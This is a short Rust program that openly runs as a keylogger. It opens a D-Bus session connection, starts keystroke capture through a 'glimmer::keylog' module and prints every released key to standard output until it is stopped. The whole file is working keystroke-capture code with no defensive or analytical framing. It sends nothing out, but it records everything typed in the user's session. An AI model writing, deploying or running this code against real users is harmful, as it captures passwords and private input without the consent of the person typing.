use glimmer::keylog;
use zbus::blocking::Connection;
use std::io::{self, Write};

fn main() -> zbus::Result<()> {
    let conn = Connection::session()?;
    let rx = keylog::start(&conn)?;

    eprintln!("[+] Keylogger active. Press Ctrl+C to stop.");

    for event in rx {
        if !event.pressed {
            print!("{}", event.as_label());
            io::stdout().flush().ok();
        }
    }

    keylog::stop(&conn)?;
    Ok(())
}